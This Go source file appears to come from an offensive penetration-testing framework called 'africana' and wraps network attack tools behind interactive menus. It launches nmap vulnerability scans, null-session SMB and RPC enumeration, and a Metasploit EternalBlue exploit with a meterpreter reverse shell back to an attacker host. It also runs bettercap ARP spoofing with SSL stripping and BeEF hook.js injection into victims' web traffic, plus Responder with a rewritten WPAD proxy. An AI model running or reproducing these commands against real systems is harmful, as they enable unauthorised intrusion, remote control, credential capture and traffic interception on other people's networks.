package internals

import (
    "os"
    "fmt"
    "utils"
    "bufio"
    "strings"
    "io/ioutil"
    "bcolors"
    "menus"
    "time"
    "subprocess"
)

var (
    userInput   string
    userTarget  string
    userLhost   string
    userLPort   string
    userName    string
    userPass    string
)

func InternalScanner() {
    subprocess.Popen(`bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; active; ticker on"`)
    fmt.Println()
}

func NmapPortscan(userTarget string) {
    fmt.Printf(bcolors.RED + "\n" + `¯\_(ツ)_/¯ ` + bcolors.BLUE + "Performing: " + bcolors.GREEN + "Full-Port scan: " + bcolors.PURPLE + "Target: " + bcolors.YELLOW + "%s🎯\n" + bcolors.ENDC, userTarget)
    Logs := fmt.Sprintf("/root/.africana/logs/nmap_full_ports_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'nmap -v -p- %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func NmapVulnscan(userTarget string) {
    fmt.Printf(bcolors.RED + "\n" + `¯\_(ツ)_/¯ ` + bcolors.BLUE + "Performing: " + bcolors.GREEN + "Full-Vuln scan: " + bcolors.PURPLE + "Target: " + bcolors.YELLOW + "%s🎯\n" + bcolors.ENDC, userTarget)
    subprocess.PopenTwo(`nmap --open -T4 -Pn -n -sSV -p- --script=vulners.nse --stats-every 10s %s`, userTarget)
    fmt.Println()
}

func SmbVulnscan(userTarget string) {
    fmt.Printf(bcolors.RED + "\n" + `¯\_(ツ)_/¯ ` + bcolors.BLUE + "Performing: " + bcolors.GREEN + "F.SMB-Vuln scan: " + bcolors.PURPLE + "Target: " + bcolors.YELLOW + "%s🎯\n" + bcolors.ENDC, userTarget)
    subprocess.PopenTwo(`nmap -sT -sV -Pn -p 445 --script=smb-vuln* --stats-every 10s %s`, userTarget)
}

func SmbMapscan(userTarget string) {
    fmt.Printf(bcolors.RED + "\n" + `¯\_(ツ)_/¯ ` + bcolors.BLUE + "Performing: " + bcolors.GREEN + "F.SMBRecon scan: " + bcolors.PURPLE + "Target: " + bcolors.YELLOW + "%s🎯\n" + bcolors.ENDC, userTarget)
    subprocess.PopenTwo(`smbmap -q -H %s -u null -p null -r --depth 5`, userTarget)
    fmt.Println()
}

func RpcEnumscan(userTarget string) {
    fmt.Printf(bcolors.RED + "\n" + `¯\_(ツ)_/¯ ` + bcolors.BLUE + "Performing: " + bcolors.GREEN + "F.RPCRecon scan: " + bcolors.PURPLE + "Target: " + bcolors.YELLOW + "%s🎯\n" + bcolors.ENDC, userTarget)
    subprocess.PopenTwo(`rpcclient -U "" -N %s`, userTarget)
    fmt.Println()
}

func SmbExploit(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        return
    }
    menus.MenuThreeOne()
    for {
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🦐" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        fmt.Scan(&userInput)
        switch userInput {
        case "0":
            return
        case "1":
            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lport:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "9999" + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🦐" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            reader := bufio.NewReader(os.Stdin)
            userLport, _ := reader.ReadString('\n')
            userLport = strings.TrimSpace(userLport)
            if userLport == "" {
                userLport = "9999"
            }
            fmt.Println()
            subprocess.Popen(`ip address`)
            fmt.Println()
            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🦐" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userLhost, _ := reader.ReadString('\n')
            userLhost = strings.TrimSpace(userLhost)
            if userLhost == "" {
                userLhost = userLhostIp
            }
            fmt.Println()
            subprocess.PopenFour(`msfdb start; msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j"`, userTarget, userLhost, userLport)
        case "99", "m", "M", "menu", "Menu", "MENU":
            menus.MenuThreeOne()
        case "00", "h", "H", "help", "Help", "HELP":
            menus.HelpMenuThree()
        default:
            fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 & 1 " + bcolors.BLUE + ")" + bcolors.ENDC)
        }
    }
    fmt.Println()
}

func PacketSniffer(userTarget string) {
    menus.MenuThreeTwo()
    for {
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        fmt.Scan(&userInput)
        switch userInput {
        case "0":
            return
        case "1":
            subprocess.PopenTwo(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on"`, userTarget)
        case "2":
            subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on"`)
        case "99", "m", "M", "menu", "Menu", "MENU":
            menus.MenuThreeTwo()
        case "00", "h", "H", "help", "Help", "HELP":
            menus.HelpMenuThree()
        default:
            fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
        }
    }
    fmt.Println()
}

func PacketsResponder() {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    backUp := "/etc/responder/Responder.conf.bak_africana"
    if _, err := os.Stat(backUp); os.IsNotExist(err) {
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Println()
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        filePath := "/etc/responder/Responder.conf"
        subprocess.Popen(`cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak_africana`)
        content, err := ioutil.ReadFile(filePath)
        if err != nil {
            fmt.Println("Error reading file:", err)
            return
        }
        oldString  := `WPADScript =`
        newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, userLhost, userLhost)
        updatedContent := strings.ReplaceAll(string(content), oldString, newString)
        err = ioutil.WriteFile(filePath, []byte(updatedContent), os.ModePerm)
        if err != nil {
            fmt.Println("Error writing to file:", err)
            return
        }
    subprocess.Popen(`responder -I eth0 -Pdv; rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)
    }else{
        subprocess.Popen(`responder -I eth0 -Pdv; rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)
    }
    fmt.Println()
}

func BeefBettercap(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    menus.MenuThreeThree()
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userInput)
    switch userInput {
    case "0":
        return
    case "1":
        backUp := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(backUp); os.IsNotExist(err) {
            fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "Type new password for the beef user:" + bcolors.GREEN + ")# " + bcolors.ENDC)
            fmt.Scan(&userPass)
            fmt.Println()
            filePath := "/etc/beef-xss/config.yaml"
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana; cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana; chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)
            _, err := ioutil.ReadFile(filePath)
            if err != nil {
                fmt.Println("Error reading file:", err)
                return
            }
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                    `passwd: "beef"`: newString,
                },
                "/usr/lib/systemd/system/beef-xss.service": {
                    `User=beef-xss`: `User=root`,
                },
            }

            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Println()
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Println()
        subprocess.PopenFive(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set arp.spoof.targets %s; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userLhost, userTarget, userLhost)
        fmt.Println()
        subprocess.Popen(`systemctl stop beef-xss.service; systemctl --no-pager status beef-xss`)
        fmt.Println()
    case "2":
        backUp := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(backUp); os.IsNotExist(err) {
            fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "Type new password for the beef user:" + bcolors.GREEN + ")# " + bcolors.ENDC)
            fmt.Scan(&userPass)
            fmt.Println()
            filePath := "/etc/beef-xss/config.yaml"
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana; cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana; chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)
            _, err := ioutil.ReadFile(filePath)
            if err != nil {
                fmt.Println("Error reading file:", err)
                return
            }
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                    `passwd: "beef"`: newString,
                },
                "/usr/lib/systemd/system/beef-xss.service": {
                    `User=beef-xss`: `User=root`,
                },
            }

            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Println()
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Println()
        subprocess.PopenFour(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userLhost, userLhost)
        fmt.Println()
        subprocess.Popen(`systemctl stop beef-xss.service; systemctl --no-pager status beef-xss`)
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
    fmt.Println()
}
